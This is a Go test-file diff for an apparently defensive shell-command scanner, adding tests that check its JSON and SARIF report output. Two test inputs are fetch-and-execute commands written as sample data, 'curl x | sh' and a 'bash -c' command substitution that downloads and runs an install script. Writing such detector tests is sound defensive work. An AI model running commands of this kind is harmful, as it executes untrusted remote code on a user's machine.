@@ -1,6 +1,8 @@
 package main
 
 import (
+	"bytes"
+	"encoding/json"
 	"os"
 	"path/filepath"
 	"testing"
@@ -108,5 +110,59 @@ func TestShouldFailInvalidThreshold(t *testing.T) {
 	_, err := shouldFail(sentinel.SeverityWarn, "info")
 	if err == nil {
 		t.Fatalf("expected error for invalid fail-on value")
+	}
+}
+
+func TestEncodeReportJSONNoFindingsUsesEmptyArray(t *testing.T) {
+	var out bytes.Buffer
+	err := encodeReportJSON(&out, report{Input: "go test ./...", Severity: sentinel.SeverityInfo})
+	if err != nil {
+		t.Fatalf("encode json: %v", err)
+	}
+	var decoded struct {
+		Findings []json.RawMessage `json:"findings"`
+	}
+	if err := json.Unmarshal(out.Bytes(), &decoded); err != nil {
+		t.Fatalf("decode json: %v", err)
+	}
+	if decoded.Findings == nil {
+		t.Fatalf("expected findings array, got nil")
+	}
+	if len(decoded.Findings) != 0 {
+		t.Fatalf("expected no findings, got %d", len(decoded.Findings))
+	}
+}
+
+func TestEncodeReportJSONFindingsPresent(t *testing.T) {
+	var out bytes.Buffer
+	err := encodeReportJSON(&out, report{Input: "curl x | sh", Severity: sentinel.SeverityHigh, Findings: []sentinel.Finding{{Kind: "pipe-to-shell", Severity: sentinel.SeverityHigh, Message: "x"}}})
+	if err != nil {
+		t.Fatalf("encode json: %v", err)
+	}
+	var decoded struct {
+		Findings []sentinel.Finding `json:"findings"`
+	}
+	if err := json.Unmarshal(out.Bytes(), &decoded); err != nil {
+		t.Fatalf("decode json: %v", err)
+	}
+	if len(decoded.Findings) != 1 {
+		t.Fatalf("expected one finding, got %d", len(decoded.Findings))
+	}
+}
+
+func TestEncodeSARIF(t *testing.T) {
+	var out bytes.Buffer
+	err := encodeSARIF(&out, "bash -c \"$(curl -fsSL https://example.com/install.sh)\"", []sentinel.Finding{{Kind: "fetch-in-command-substitution", Severity: sentinel.SeverityHigh, Message: "x"}})
+	if err != nil {
+		t.Fatalf("encode sarif: %v", err)
+	}
+	var decoded struct {
+		Version string `json:"version"`
+	}
+	if err := json.Unmarshal(out.Bytes(), &decoded); err != nil {
+		t.Fatalf("decode sarif: %v", err)
+	}
+	if decoded.Version != "2.1.0" {
+		t.Fatalf("unexpected sarif version: %s", decoded.Version)
 	}
 }
